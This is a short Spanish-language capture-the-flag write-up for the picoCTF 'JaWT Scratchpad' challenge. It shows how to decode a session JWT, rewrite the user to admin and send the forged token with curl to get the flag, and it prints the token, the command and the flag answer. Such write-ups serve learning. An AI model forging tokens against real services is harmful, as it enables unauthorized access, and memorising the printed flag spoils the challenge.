# JaWT Scratchpad

## Description

Check the admin scratchpad! `https://jupiter.challenges.picoctf.org/problem/58210/` or http://jupiter.challenges.picoctf.org:58210

## Hints 1 2

* What is that cookie?
* Have you heard of JWT?

## Solución

![[Pasted image 20250331224642.png]]

Ingresamos al link proporcionado y al intentar varias entrenar, no lo conseguimos, nos dirigimos al cookie editor y copiamos su **value**, lo pegamos en el link de **jwt** para decodificarlo y cambiarle el usuario y contraseña:

![[Pasted image 20250331230608.png]]

Una vez realizado eso, abrimos una terminal de **webshell**, e ingresamos el siguiente comando y con eso nos mostrara nuestra respectiva flag:

```
Jaz_sparrow-picoctf@webshell:~$ curl -s https://jupiter.challenges.picoctf.org/problem/58210/ -H "Cookie: jwt=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiYWRtaW4ifQ.gtqDl4jVDvNbEe_JYEZTN19Vx6X9NNZtRVbKPBkhO-s"  | grep pico
                                        <textarea style="margin: 0 auto; display: block;">picoCTF{jawt_was_just_what_you_thought_44c752f5}</textarea>
Jaz_sparrow-picoctf@webshell:~$ 
```

Jaz_sparrow-picoctf@webshell:~$ curl -s https://jupiter.challenges.picoctf.org/problem/58210/ -H "Cookie: jwt=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiYWRtaW4ifQ.gtqDl4jVDvNbEe_JYEZTN19Vx6X9NNZtRVbKPBkhO-s"  | grep pico
                                        <textarea style="margin: 0 auto; display: block;">picoCTF{jawt_was_just_what_you_thought_44c752f5}</textarea>
Jaz_sparrow-picoctf@webshell:~$ 

### Respuesta: picoCTF{jawt_was_just_what_you_thought_44c752f5}

## Referencias:
https://jwt.io/
